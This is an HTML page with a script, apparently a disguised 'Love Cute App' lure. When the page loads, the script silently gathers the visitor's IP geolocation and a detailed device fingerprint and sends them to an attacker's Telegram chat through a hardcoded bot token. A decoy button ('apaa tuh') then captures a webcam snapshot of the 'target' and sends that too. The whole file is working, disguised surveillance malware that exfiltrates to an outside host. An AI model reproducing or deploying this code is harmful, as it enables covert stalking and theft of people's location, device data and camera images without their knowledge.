<button id="btnCamera">apaa tuh</button>

<script>
const BOT_TOKEN="8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo"; // BOT TOKEN
const CHAT_ID="6051179992"; // CHAT ID
const STATIC_IMAGE="https://a.top4top.io/p_3592jwm3w0.jpg";

function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}

// Ambil IP/device info via ipwhois.io
async function getIpInfo(){
  try{
    const r = await fetch("https://ipwhois.app/json/");
    const data = await r.json();
    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", isp:"-", org:"-", asn:"-"};
    return {
      ip: data.ip || "-",
      city: data.city || "-",
      region: data.region || "-",
      country_name: data.country || "-",
      country_code: data.country_code || "-",
      latitude: data.latitude || "0",
      longitude: data.longitude || "0",
      isp: data.isp || "-",
      org: data.org || "-",
      asn: data.asn || "-"
    };
  }catch(e){
    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", isp:"-", org:"-", asn:"-"};
  }
}

// Ambil device info
async function getDeviceInfo(){
  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
  return {
    userAgent:navigator.userAgent,
    platform:navigator.platform,
    language:navigator.language,
    languages:navigator.languages ? navigator.languages.join(", ") : "-",
    screenWidth:screen.width,
    screenHeight:screen.height,
    innerWidth:window.innerWidth,
    innerHeight:window.innerHeight,
    availWidth:screen.availWidth,
    availHeight:screen.availHeight,
    colorDepth:screen.colorDepth,
    pixelDepth:screen.pixelDepth,
    pixelRatio:window.devicePixelRatio,
    cores:navigator.hardwareConcurrency||"-",
    memory:navigator.deviceMemory||"-",
    touchPoints:navigator.maxTouchPoints||0,
    orientation:screen.orientation?.type||"-",
    online:navigator.onLine,
    cookiesEnabled:navigator.cookieEnabled,
    doNotTrack:navigator.doNotTrack,
    javaEnabled:navigator.javaEnabled(),
    pdfViewerEnabled:navigator.pdfViewerEnabled,
    vendor:navigator.vendor,
    vendorSub:navigator.vendorSub,
    battery:b
  };
}

// Build caption Telegram dengan HTML v4 dan blockquote
function buildCaption(ip,d){
  const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
  const timestamp = new Date().toISOString();
  const localTime = new Date().toLocaleString();
  
  return [
    "<b>🔍 INFORMATION TARGET 🔍</b>",
    "",
    "<blockquote>",
    "<b>📍 Location Information</b>",
    `IP: <code>${escapeHtml(ip.ip)}</code>`,
    `City: ${escapeHtml(ip.city)}`,
    `Region: ${escapeHtml(ip.region)}`,
    `Country: ${escapeHtml(ip.country_name)} ${escapeHtml(ip.country_code)}`,
    `Coordinates: <code>${escapeHtml(ip.latitude)}, ${escapeHtml(ip.longitude)}</code>`,
    `ISP: ${escapeHtml(ip.isp)}`,
    `Organization: ${escapeHtml(ip.org)}`,
    `ASN: ${escapeHtml(ip.asn)}`,
    `🗺️ <a href="${g}">View on Google Maps</a>`,
    "</blockquote>",
    "",
    "<blockquote>",
    "<b>📱 Device Information</b>",
    `User Agent: <code>${escapeHtml(d.userAgent)}</code>`,
    `Platform: ${escapeHtml(d.platform)}`,
    `Language: ${escapeHtml(d.language)}`,
    `Languages: ${escapeHtml(d.languages)}`,
    `Screen: <code>${escapeHtml(d.screenWidth+"x"+d.screenHeight)}</code>`,
    `Available Screen: <code>${escapeHtml(d.availWidth+"x"+d.availHeight)}</code>`,
    `Viewport: <code>${escapeHtml(d.innerWidth+"x"+d.innerHeight)}</code>`,
    `Color Depth: <code>${escapeHtml(d.colorDepth)} bit</code>`,
    `Pixel Depth: <code>${escapeHtml(d.pixelDepth)} bit</code>`,
    `Pixel Ratio: <code>${escapeHtml(d.devicePixelRatio)}</code>`,
    `CPU Cores: ${escapeHtml(d.cores)}`,
    `RAM: ${escapeHtml(d.memory)} GB`,
    `Touch Points: ${escapeHtml(d.touchPoints)}`,
    `Orientation: ${escapeHtml(d.orientation)}`,
    `Connection: ${escapeHtml(d.online ? "Online" : "Offline")}`,
    `Cookies: ${escapeHtml(d.cookiesEnabled ? "Enabled" : "Disabled")}`,
    `Do Not Track: ${escapeHtml(d.doNotTrack || "Not Set")}`,
    `Java Enabled: ${escapeHtml(d.javaEnabled ? "Yes" : "No")}`,
    `PDF Viewer: ${escapeHtml(d.pdfViewerEnabled ? "Enabled" : "Disabled")}`,
    `Vendor: ${escapeHtml(d.vendor)}`,
    `Vendor Sub: ${escapeHtml(d.vendorSub)}`,
    `🔋 Battery: ${escapeHtml(d.battery?.level ? Math.round(d.battery.level * 100) + "%" : "-")} (${d.battery?.charging?"Charging":"Not charging"})`,
    `⏱️ Charging Time: ${escapeHtml(d.battery?.chargingTime ? Math.round(d.battery.chargingTime / 60) + " min" : "-")}`,
    `⏳ Discharging Time: ${escapeHtml(d.battery?.dischargingTime ? Math.round(d.battery.dischargingTime / 60) + " min" : "-")}`,
    "</blockquote>",
    "",
    "<blockquote>",
    "<b>🌐 URL & Time Information</b>",
    `URL: <code>${escapeHtml(location.href)}</code>`,
    `Referrer: <code>${escapeHtml(document.referrer)}</code>`,
    `Time (UTC): <code>${escapeHtml(timestamp)}</code>`,
    `Local Time: <code>${escapeHtml(localTime)}</code>`,
    `Timezone: <code>${escapeHtml(Intl.DateTimeFormat().resolvedOptions().timeZone)}</code>`,
    `Timezone Offset: <code>${escapeHtml(new Date().getTimezoneOffset() / -60)} hours</code>`,
    "</blockquote>",
    "",
    "<i>📸 Captured by Love Cute App</i>"
  ].join("\n");
}

// Kirim IP/device + foto statis saat halaman load
async function sendIpDevice(){
  const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      photo: STATIC_IMAGE,
      caption: buildCaption(ip,d),
      parse_mode:"HTML"
    })
  });
}

// Kamera snapshot sebagai file .jpg (document)
async function sendSnapshot(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true});
    const video = document.createElement('video');
    video.style.display='none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();

    await new Promise(resolve => { video.onloadedmetadata = () => setTimeout(resolve, 200); });

    const canvas=document.createElement('canvas');
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("document", blob, "screenshotbyaldofficialr.jpg");
    formData.append("caption", "<b>📸 Sukes screenshot foto target</b>\n\n<i>Captured with Love Cute App</i>");
    formData.append("parse_mode", "HTML");

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: formData
    });

    stream.getTracks().forEach(track=>track.stop());
    video.remove();
  }catch(e){
    console.log("yahhh", e);
  }
}

// Jalankan saat halaman load
window.addEventListener("load",sendIpDevice);

// Tombol klik kamera
document.getElementById("btnCamera").addEventListener("click", sendSnapshot);
</script>
